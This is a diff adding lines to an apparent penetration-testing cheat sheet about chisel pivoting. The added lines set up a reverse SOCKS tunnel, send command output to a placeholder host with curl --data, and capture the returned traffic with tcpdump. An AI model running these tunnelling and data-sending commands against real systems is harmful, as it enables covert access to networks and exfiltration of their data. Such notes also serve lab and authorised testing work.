@@ -886,6 +886,16 @@ ping -n 1 <RHOST>
 ./chisel client 192.168.50.10:9002 R:socks
 ```
 
+Returning output to server
+```shell
+./chisel client 192.168.50.10:9002 R:socks &> /tmp/output; curl --data @/tmp/output http://<HOST>:9002/
+```
+
+Listening on server to get output returned from client
+```shell
+sudo tcpdump -nvvvXi tun0 tcp port 9002
+```
+
 Connecting via ssh using chisel
 ```shell
 ss -ntplu | grep chisel # --> port (usually 1080)
